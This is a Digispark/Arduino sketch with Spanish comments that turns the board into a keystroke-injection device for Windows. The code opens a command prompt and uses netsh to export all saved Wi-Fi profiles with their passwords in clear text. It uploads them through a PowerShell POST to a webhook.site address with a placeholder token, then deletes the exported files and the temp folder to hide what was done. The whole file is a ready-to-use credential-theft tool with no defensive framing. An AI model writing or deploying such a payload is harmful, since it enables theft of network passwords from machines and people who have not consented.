#include "DigiKeyboard.h"

void setup() {
  // No se necesita activar nada, nada mas con esto jala
}


void loop() {

DigiKeyboard.update();
DigiKeyboard.sendKeyStroke(0);
// Generalmente este no es necesario, pero hace las cosas con faciles, con maquinas mas antiguas.
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // dispara el run
DigiKeyboard.delay(100);
DigiKeyboard.println("cmd");
// DigiKeyboard.println("cmd /k con: cols=15 lines=1");
DigiKeyboard.delay(500);
DigiKeyboard.println("cd /.");
DigiKeyboard.delay(300);
DigiKeyboard.println("md temp");
DigiKeyboard.delay(300);
DigiKeyboard.println("cd temp");
DigiKeyboard.delay(300);
DigiKeyboard.println("netsh");
DigiKeyboard.delay(300);
DigiKeyboard.println("wlan");
DigiKeyboard.delay(300);
DigiKeyboard.println("export profile key=clear");
DigiKeyboard.delay(300);
DigiKeyboard.println("exit");
DigiKeyboard.delay(300);
DigiKeyboard.println("copy *.xml wifi.txt");
DigiKeyboard.delay(300);
DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/TUTOKEN -Method POST -InFile wifi.txt");
DigiKeyboard.delay(300);
DigiKeyboard.println("del *.xml");
DigiKeyboard.delay(300);
DigiKeyboard.println("del *.txt");
DigiKeyboard.delay(300);
DigiKeyboard.println("cd /.");
DigiKeyboard.delay(300);
DigiKeyboard.println("rd temp");
DigiKeyboard.delay(300);
DigiKeyboard.println("exit"); 

// Indicador

DigiKeyboard.delay(500);
while (true)
{
  digitalWrite(0, HIGH);
  digitalWrite(1, HIGH);
  delay(300);
  digitalWrite(0, LOW);
  digitalWrite(1, LOW);
  delay(300);
}
}